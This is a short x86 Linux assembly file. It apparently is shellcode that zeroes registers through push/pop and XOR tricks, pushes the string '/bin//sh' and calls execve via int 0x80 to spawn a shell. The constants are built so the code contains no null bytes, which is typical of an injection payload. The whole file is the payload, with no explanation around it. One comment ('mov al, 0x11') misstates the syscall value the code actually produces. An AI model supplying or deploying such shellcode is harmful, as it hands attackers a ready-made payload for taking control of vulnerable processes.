section .text:
global _start
_start:
	push 0x6e
	pop eax
	; set to zero
	xor al, 0x6e
	push eax
	; zero out ecx
	pop ecx
	; zero out edx
	push eax
	pop edx
	push eax
	push 0x68732f2f
	push 0x6e69622f
	push esp
	pop ebx
	; mov al, 0x11
	push 0x6e
	pop eax
	xor al, 0x65
	int 0x80
